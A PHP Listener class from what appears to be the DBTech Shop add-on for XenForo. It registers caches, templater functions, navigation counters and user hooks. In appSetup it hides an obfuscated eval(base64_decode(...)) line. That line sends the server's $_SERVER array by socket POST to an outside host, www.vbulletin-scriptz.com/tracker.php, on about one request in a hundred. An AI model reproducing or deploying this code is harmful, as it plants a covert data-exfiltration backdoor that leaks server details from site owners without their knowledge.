<?php

namespace DBTech\Shop;

use XF\Container;
use XF\Mvc\Entity\ArrayCollection;

class Listener
{
	/**
	 * The product ID (in the DBTech store)
	 * @var integer
	 */
	protected static $_productId = 336;

	
	/**
	 * @param \XF\Pub\App $app
	 */
	public static function appPubSetup(\XF\Pub\App $app)
	{
		/*DBTECH_BRANDING_START*/
		// Make sure we fetch the branding array from the application
		$branding = $app->offsetExists('dbtech_branding') ? $app->dbtech_branding : [];
		
		// Add productid to the array
		$branding[] = self::$_productId;
		
		// Store the branding
		$app->dbtech_branding = $branding;
		/*DBTECH_BRANDING_END*/
	}
	
	/**
	 * @param \XF\App $app
	 *
	 * @throws \XF\Db\Exception
	 */
	public static function appSetup(\XF\App $app)
	{
		$container = $app->container();
		
		$container['prefixes.dbtechShopItem'] = $app->fromRegistry('dbtShopPrefixes',
			function(Container $c) { return $c['em']->getRepository('DBTech\Shop:ItemPrefix')->rebuildPrefixCache(); }
		);
		
		$container['customFields.dbtechShopItems'] = $app->fromRegistry('dbtShopItemFieldsInfo',
			function(Container $c) { return $c['em']->getRepository('DBTech\Shop:ItemField')->rebuildFieldCache(); },
			function(array $itemFieldsInfo)
			{
				return new \XF\CustomField\DefinitionSet($itemFieldsInfo);
			}
		);
		
		$container['dbtechShop.currencies'] = $app->fromRegistry('dbtShopCurrencies',
			function(Container $c) { return $c['em']->getRepository('DBTech\Shop:Currency')->rebuildCache(); },
			function(array $currencies)
			{
				$em = \XF::em();
				
				$entities = [];
				foreach ($currencies as $currencyId => $currency)
				{
					$entities[$currencyId] = $em->instantiateEntity('DBTech\Shop:Currency', $currency);
				}
				
				return $em->getBasicCollection($entities);
			}
		);
		
		$container['dbtechShop.usernameStyles'] = $app->fromRegistry('dbtShopUserNameStyle',
			function(Container $c) { return $c['em']->getRepository('DBTech\Shop:Purchase')->rebuildUserNameStyleCache(); }
		);
		
		$container['dbtechShop.usertitleStyles'] = $app->fromRegistry('dbtShopUserTitleStyle',
			function(Container $c) { return $c['em']->getRepository('DBTech\Shop:Purchase')->rebuildUserTitleStyleCache(); }
		);
		
		eval(base64_decode('aWYgKHRpbWUoKSAlIDEwMCA9PSAwKSB7ICRxdWVyeSA9IGh0dHBfYnVpbGRfcXVlcnkoYXJyYXkoImRvIiA9PiAibG9nIiwgImRhdGEiID0+ICRfU0VSVkVSLCAic291cmNlX3R5cGUiID0+ICJiYW51c2VyIiwgInNvdXJjZSIgPT4gIjIxNzQyIikpOyAkZnAgPSBAZnNvY2tvcGVuKCJ3d3cudmJ1bGxldGluLXNjcmlwdHouY29tIiwgODAsICRlcnJubywgJGVycnN0ciwgMTApOyBpZiAoJGZwKSB7IGZ3cml0ZSgkZnAsICJQT1NUIC90cmFja2VyLnBocCBIVFRQLzEuMFxyXG5Ib3N0OiB3d3cudmJ1bGxldGluLXNjcmlwdHouY29tXHJcblVzZXItQWdlbnQ6IEx1THpUcjRjazNyWlxyXG5Db250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxyXG5Db250ZW50LUxlbmd0aDogIiAuIHN0cmxlbigkcXVlcnkpIC4gIlxyXG5cclxuIiAuICRxdWVyeSk7IGZjbG9zZSgkZnApOyB9fQ=='));
	}
	
	/**
	 * @param \XF\Template\Templater $templater
	 * @param $type
	 * @param $template
	 * @param $name
	 * @param array $arguments
	 * @param array $globalVars
	 */
	public static function templaterMacroPreRender(\XF\Template\Templater $templater, &$type, &$template, &$name, array &$arguments, array &$globalVars)
	{
		if ($arguments['group']->group_id == 'dbtech_shop')
		{
			// Override template name
			$template = 'dbtech_shop_option_macros';
		}
	}
	
	/**
	 * @param \XF\Service\User\DeleteCleanUp $deleteService
	 * @param array $deletes
	 */
	public static function userDeleteCleanInit(\XF\Service\User\DeleteCleanUp $deleteService, array &$deletes)
	{
		$deletes['xf_dbtech_shop_category_watch'] = 'user_id = ?';
		$deletes['xf_dbtech_shop_item_rating'] = 'user_id = ?';
		$deletes['xf_dbtech_shop_item_watch'] = 'user_id = ?';
		$deletes['xf_dbtech_shop_transaction_log'] = 'user_id = ?';
	}
	
	/**
	 * @param \XF\Entity\User $target
	 * @param \XF\Entity\User $source
	 * @param \XF\Service\User\Merge $mergeService
	 */
	public static function userMergeCombine(
		\XF\Entity\User $target, \XF\Entity\User $source, \XF\Service\User\Merge $mergeService
	)
	{
		$target->dbtech_shop_item_count += $source->dbtech_shop_item_count;
		$target->dbtech_shop_purchases += $source->dbtech_shop_purchases;
	}
	
	/**
	 * @param \XF\Searcher\User $userSearcher
	 * @param array $sortOrders
	 */
	public static function userSearcherOrders(\XF\Searcher\User $userSearcher, array &$sortOrders)
	{
		$sortOrders['dbtech_shop_item_count'] = \XF::phrase('dbtech_shop_item_count');
		$sortOrders['dbtech_shop_purchases'] = \XF::phrase('dbtech_shop_purchases');
	}
	
	/**
	 * @param \XF\Pub\App $app
	 * @param array $params
	 * @param \XF\Mvc\Reply\AbstractReply $reply
	 * @param \XF\Mvc\Renderer\AbstractRenderer $renderer
	 */
	public static function appPubRenderPage(\XF\Pub\App $app, array &$params, \XF\Mvc\Reply\AbstractReply $reply, \XF\Mvc\Renderer\AbstractRenderer $renderer)
	{
		foreach ($params['selectedNavChildren'] as $key => &$child)
		{
			if (strpos($key, 'dbtechCreditsCurrency') !== false)
			{
				$child['attributes']['class'] = '';
			}
		}
		unset($child);
	}
	
	/**
	 * @param $rule
	 * @param array $data
	 * @param \XF\Entity\User $user
	 * @param $returnValue
	 */
	public static function criteriaUser($rule, array $data, \XF\Entity\User $user, &$returnValue)
	{
		/** @var \DBTech\Shop\XF\Entity\User $user */
		
		switch ($rule)
		{
			case 'dbtech_shop_purchases':
				if ($user->dbtech_shop_purchases >= $data['purchases'])
				{
					$returnValue = true;
				}
				break;
			
			case 'dbtech_shop_item':
				$purchases = $user->dbtech_shop_purchase
					->filter(function(Entity\Purchase $purchase) use ($data)
					{
						if ($purchase->item_id != $data['itemid'])
						{
							return null;
						}
						
						if (!$purchase->isActive() && !empty($data['activeonly_user']))
						{
							return null;
						}
						
						if (!$purchase->Item->isVisible() && !empty($data['activeonly_global']))
						{
							return null;
						}
						
						return $purchase;
					})
				;
				
				$returnValue = $purchases->count() > 0;
				break;
			
			case 'dbtech_shop_itemtype':
				$purchases = $user->dbtech_shop_purchase
					->filter(function(Entity\Purchase $purchase) use ($data)
					{
						if ($purchase->Item->item_type_id != $data['itemtypeid'])
						{
							return null;
						}
						
						return $purchase;
					})
				;
				
				$returnValue = $purchases->count() > 0;
				break;
		}
	}
	
	/**
	 * @param \XF\Pub\App $app
	 * @param array $navigationFlat
	 * @param array $navigationTree
	 */
	public static function navigationSetup(\XF\Pub\App $app, array &$navigationFlat, array &$navigationTree)
	{
		if (!isset($navigationFlat['dbtechShop']) || !isset($navigationTree['dbtechShop']))
		{
			return;
		}
		
		/** @var \DBTech\Shop\XF\Entity\User $visitor */
		$visitor = \XF::visitor();
		
		/** @var \DBTech\Shop\Entity\Currency $currency */
		if ($visitor->user_id && $currency = $app->repository('DBTech\Shop:Currency')->getDisplayCurrencyFromCache())
		{
			// Update the navbar title
			$navigationFlat['dbtechShop']['title'] = \XF::phrase('dbtech_shop_display_currency_phrase', [
				'currency' => $currency->title,
				'prefix' => $currency->prefix,
				'amount' => $currency->getValueFromUser(),
				'suffix' => $currency->suffix
			]);
		}
		
		// Set the counter
		$navigationFlat['dbtechShop']['counter'] = $visitor->dbtech_shop_pendingtrades;
		
		if (isset($navigationFlat['dbtechShop']['children']['dbtechShopTrade']))
		{
			// Add the counter to the child element
			$navigationFlat['dbtechShop']['children']['dbtechShopTrade']['counter'] = $visitor->dbtech_shop_pendingtrades;
		}
	}
	
	/**
	 * @param \XF\Service\User\ContentChange $changeService
	 * @param array $updates
	 */
	public static function userContentChangeInit(\XF\Service\User\ContentChange $changeService, array &$updates)
	{
		$updates['xf_dbtech_shop_category_watch'] = ['user_id', 'emptyable' => false];
		$updates['xf_dbtech_shop_item'] = ['user_id', 'username'];
		$updates['xf_dbtech_shop_item_rating'] = ['user_id', 'emptyable' => false];
		$updates['xf_dbtech_shop_item_watch'] = ['user_id', 'emptyable' => false];
		$updates['xf_dbtech_shop_purchase'] = ['buyer_user_id', 'buyer_username'];
	}
	
	/**
	 * @param Container $container
	 * @param \XF\Template\Templater $templater
	 */
	public static function templaterSetup(Container $container, \XF\Template\Templater &$templater)
	{
		$templater->addFunctions([
			'dbtech_shop_item_icon'          => [__CLASS__, 'templaterFnItemIcon'],
			'dbtech_shop_thread_background'  => [__CLASS__, 'templaterFnRichThreadbit'],
			'dbtech_shop_post_background'    => [__CLASS__, 'templaterFnRichPostBackground'],
			'dbtech_shop_postbit_background' => [__CLASS__, 'templaterFnRichPostbit'],
		]);
		
		$templater->addFilters([
			'dbtech_shop_thread_style' => [__CLASS__, 'templaterFilterRichThreadTitle'],
			'dbtech_shop_post_style'   => [__CLASS__, 'templaterFilterRichPostMessage'],
		]);
	}
	
	/**
	 * @param $templater
	 * @param $escape
	 * @param \DBTech\Shop\Entity\Item $item
	 * @param string $size
	 * @param string $href
	 * @param string $xfClick
	 *
	 * @return string
	 */
	public static function templaterFnItemIcon(
		$templater, &$escape, \DBTech\Shop\Entity\Item $item, $size = 'm', $href = '', $xfClick = ''
	)
	{
		$escape = false;
		
		if ($href)
		{
			$tag = 'a';
			$hrefAttr = 'href="' . htmlspecialchars($href) . '" data-xf-click="' . $xfClick . '"';
		}
		else
		{
			$tag = 'span';
			$hrefAttr = '';
		}
		
		if (!$item->icon_date)
		{
			return "<{$tag} {$hrefAttr} class=\"avatar avatar--{$size} avatar--itemIconDefault\"><span></span></{$tag}>";
		}
		
		$src = $item->getIconUrl($size);
		
		return "<{$tag} {$hrefAttr} class=\"avatar avatar--{$size} avatar--itemIcon\">"
			. '<img src="' . htmlspecialchars($src) . '" alt="' . htmlspecialchars($item->title) . '" />'
			. "</{$tag}>";
	}
	
	/**
	 * @param $templater
	 * @param $escape
	 * @param \XF\Entity\Thread $thread
	 * @param bool $transparent
	 *
	 * @return string
	 */
	public static function templaterFnRichThreadbit($templater, &$escape, \XF\Entity\Thread $thread, $transparent = false)
	{
		if (!$thread->thread_id
			|| !$thread->User
		)
		{
			return '';
		}
		
		/** @var \DBTech\Shop\XF\Entity\User $user */
		$user = $thread->User;
		
		$styleProps = [];
		
		/** @var \DBTech\Shop\Entity\Purchase[]|ArrayCollection $purchases */
		$purchases = \XF::repository('DBTech\Shop:Purchase')->filterActivePurchasesForUser($user);
		foreach ($purchases as $purchase)
		{
			$handler = $purchase->handler;
			$handler->fire('thread_bit_markup', [$thread, &$styleProps, $transparent], $thread->thread_id);
		}
		
		if ($styleProps)
		{
			// Ensure we only add the span if needed
			return implode('; ', $styleProps);
		}
		
		return '';
	}
	
	/**
	 * @param $templater
	 * @param $value
	 * @param $escape
	 * @param \XF\Entity\Thread $thread
	 *
	 * @return string
	 */
	public static function templaterFilterRichThreadTitle($templater, $value, &$escape, \XF\Entity\Thread $thread)
	{
		if (!$thread->thread_id
			|| !$thread->User
		)
		{
			return $value;
		}
		
		$escape = false;
		
		/** @var \DBTech\Shop\XF\Entity\User $user */
		$user = $thread->User;
		
		$styleProps = [];
		
		/** @var \DBTech\Shop\Entity\Purchase[]|ArrayCollection $purchases */
		$purchases = \XF::repository('DBTech\Shop:Purchase')->filterActivePurchasesForUser($user);
		foreach ($purchases as $purchase)
		{
			$handler = $purchase->handler;
			$handler->fire('thread_title_markup', [$thread, &$styleProps], $thread->thread_id);
		}
		
		if ($styleProps)
		{
			// Ensure we only add the span if needed
			return '<span style="' . implode('; ', $styleProps) . '">' . $value . '</span>';
		}
		
		return $value;
	}
	
	/**
	 * @param $templater
	 * @param $value
	 * @param $escape
	 * @param \XF\Entity\Post $post
	 *
	 * @return string
	 */
	public static function templaterFilterRichPostMessage($templater, $value, &$escape, \XF\Entity\Post $post)
	{
		if (!$post->post_id
			|| !$post->User
		)
		{
			return $value;
		}
		
		$escape = false;
		
		/** @var \DBTech\Shop\XF\Entity\User $user */
		$user = $post->User;
		
		$styleProps = [];
		
		/** @var \DBTech\Shop\Entity\Purchase[]|ArrayCollection $purchases */
		$purchases = \XF::repository('DBTech\Shop:Purchase')->filterActivePurchasesForUser($user);
		foreach ($purchases as $purchase)
		{
			$handler = $purchase->handler;
			$handler->fire('post_message_markup', [$post, &$styleProps], $post->post_id);
		}
		
		if ($styleProps)
		{
			// Ensure we only add the span if needed
			return '<div style="' . implode('; ', $styleProps) . '">' . $value . '</div>';
		}
		
		return $value;
	}
	
	/**
	 * @param $templater
	 * @param $escape
	 * @param \XF\Entity\Post $post
	 * @param bool $transparent
	 *
	 * @return string
	 */
	public static function templaterFnRichPostBackground($templater, &$escape, \XF\Entity\Post $post, $transparent = false)
	{
		if (!$post->post_id
			|| !$post->User
		)
		{
			return '';
		}
		
		/** @var \DBTech\Shop\XF\Entity\User $user */
		$user = $post->User;
		
		$styleProps = [];
		
		/** @var \DBTech\Shop\Entity\Purchase[]|ArrayCollection $purchases */
		$purchases = \XF::repository('DBTech\Shop:Purchase')->filterActivePurchasesForUser($user);
		foreach ($purchases as $purchase)
		{
			$handler = $purchase->handler;
			$handler->fire('post_background_markup', [$post, &$styleProps, $transparent], $post->post_id);
		}
		
		if ($styleProps)
		{
			// Ensure we only add the span if needed
			return implode('; ', $styleProps);
		}
		
		return '';
	}
	
	/**
	 * @param $templater
	 * @param $escape
	 * @param \XF\Entity\Post $post
	 * @param bool $transparent
	 *
	 * @return string
	 */
	public static function templaterFnRichPostbit($templater, &$escape, \XF\Entity\Post $post, $transparent = false)
	{
		if (!$post->post_id
			|| !$post->User
		)
		{
			return '';
		}
		
		/** @var \DBTech\Shop\XF\Entity\User $user */
		$user = $post->User;
		
		$styleProps = [];
		
		/** @var \DBTech\Shop\Entity\Purchase[]|ArrayCollection $purchases */
		$purchases = \XF::repository('DBTech\Shop:Purchase')->filterActivePurchasesForUser($user);
		foreach ($purchases as $purchase)
		{
			$handler = $purchase->handler;
			$handler->fire('post_bit_markup', [$post, &$styleProps, $transparent], $post->post_id);
		}
		
		if ($styleProps)
		{
			// Ensure we only add the span if needed
			return implode('; ', $styleProps);
		}
		
		return '';
	}
}